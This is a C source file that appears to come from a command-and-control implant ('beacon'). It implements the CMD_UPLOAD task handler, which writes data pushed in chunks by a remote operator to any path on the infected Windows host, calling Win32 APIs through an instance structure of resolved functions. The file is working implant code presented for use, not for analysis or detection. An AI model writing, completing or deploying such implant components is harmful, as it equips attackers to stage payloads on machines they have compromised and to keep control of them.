/* beacon/src/Commands/Upload.c
 * CMD_UPLOAD (0x26) - write accumulated MemSave data to disk.
 *
 * Task args wire format:
 *   memoryId(4LE) + path_len(4LE) + path_bytes
 *
 * The file data was previously accumulated via CMD_SAVEMEMORY chunks.
 * After writing, the MemSave buffer is freed.
 *
 * Result on success: zero-length data, status=OK
 * Result on failure: Win32_error(4LE), status=ERR */

#include "Nax.h"

FUNC INT NaxCmdUpload( PNAX_INSTANCE Nax, const PBYTE args, UINT32 args_len, PBYTE out, UINT32* out_len ) {
    if ( !args || args_len < 8 ) return NAX_ERR_INVAL;

    UINT32 memoryId = NaxR32( args );
    UINT32 path_len = NaxR32( args + 4 );
    if ( 8 + path_len > args_len ) return NAX_ERR_INVAL;

    PCHAR path_buf = (PCHAR)Nax->Ntdll.RtlAllocateHeap( Nax->Heap, 0, path_len + 1 );
    if ( !path_buf ) return NAX_ERR_NOMEM;
    MmCopy( path_buf, args + 8, path_len );
    path_buf[ path_len ] = '\0';

    /* Look up accumulated data */
    NAX_MEMSAVE* ms = NaxMemSaveGet( Nax, memoryId );
    if ( !ms || !ms->Buffer ) {
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
        *out_len = 0;
        return NAX_ERR_INVAL;
    }

    HANDLE hFile = Nax->Kernel32.CreateFileA( path_buf, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( hFile == INVALID_HANDLE_VALUE ) {
        DWORD err = Nax->Kernel32.GetLastError ? Nax->Kernel32.GetLastError() : 0;
        NaxWriteWin32ErrCode( out, out_len, err );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
        NaxMemSaveFree( Nax, memoryId );
        return NAX_ERR_FAIL;
    }

    DWORD written = 0;
    BOOL ok = TRUE;
    if ( ms->CurrentSize > 0 )
        ok = Nax->Kernel32.WriteFile( hFile, ms->Buffer, ms->CurrentSize, &written, NULL );

    if ( !ok || written != ms->CurrentSize ) {
        DWORD err = Nax->Kernel32.GetLastError ? Nax->Kernel32.GetLastError() : 0;
        NaxWriteWin32ErrCode( out, out_len, err );
        Nax->Kernel32.CloseHandle( hFile );
        Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
        NaxMemSaveFree( Nax, memoryId );
        return NAX_ERR_FAIL;
    }

    Nax->Kernel32.CloseHandle( hFile );
    Nax->Ntdll.RtlFreeHeap( Nax->Heap, 0, path_buf );
    NaxMemSaveFree( Nax, memoryId );

    *out_len = 0;
    return NAX_OK;
}
